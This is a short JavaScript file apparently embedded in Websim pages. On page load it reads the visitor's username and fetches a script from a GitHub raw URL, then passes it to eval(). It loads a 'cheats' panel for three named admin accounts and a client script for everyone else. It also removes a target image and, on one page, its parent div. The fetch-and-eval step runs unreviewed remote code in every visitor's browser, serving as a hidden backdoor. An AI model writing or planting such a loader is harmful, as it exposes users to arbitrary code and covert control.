// Before anything else, check if the page is loaded
let admins = ["blueyellow", "TheEthicalHacker", "CarEngine"];
async function fetchAndRun(url, room) {
  const response = await fetch(url);
  const data = await response.text();
  eval(data)

}
if (document.readyState !== 'loading') {
  let room = new WebsimSocket();
  room.initialize();
  let user = room.peers[room.clientId];
  let name = user.username;

  // Check for unauthorized users
  if (admins.includes(name)) {
    console.log("Loading cheats for Websim....");
    const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/panel.js", room)

  } else {
    const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/client.js", room)
  }
  const targetImage = document.getElementById('targetImage');
  if (targetImage) {
    // But wait! If the current page url contains hmb2y2w5ei78d1fnyvfj, then remove the div 2 layers above the targetImage
    if (window.location.href.includes("hmb2y2w5ei78d1fnyvfj")) {
      const parentDiv = targetImage.parentNode.parentNode;
      if (parentDiv) {
        parentDiv.remove();
      }
    }
    targetImage.remove();
  }
} else {
  document.addEventListener('DOMContentLoaded', function () {
    let room = new WebsimSocket();
    room.initialize();
    let user = room.peers[room.clientId];
    let name = user.username;
    // Check for unauthorized users
    if (admins.includes(name)) {
      console.log("Loading cheats for Websim....");
      const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/panel.js", room)

    } else {
      const panel = fetchAndRun("https://raw.githubusercontent.com/JammyCat91283/websim/main/client.js", room)
    }
    const targetImage = document.getElementById('targetImage');
    if (targetImage) {
      // But wait! If the current page url contains hmb2y2w5ei78d1fnyvfj, then remove the div 2 layers above the targetImage
      if (window.location.href.includes("hmb2y2w5ei78d1fnyvfj")) {
        const parentDiv = targetImage.parentNode.parentNode;
        if (parentDiv) {
          parentDiv.remove();
        }
      }
      targetImage.remove();
    }
  });
}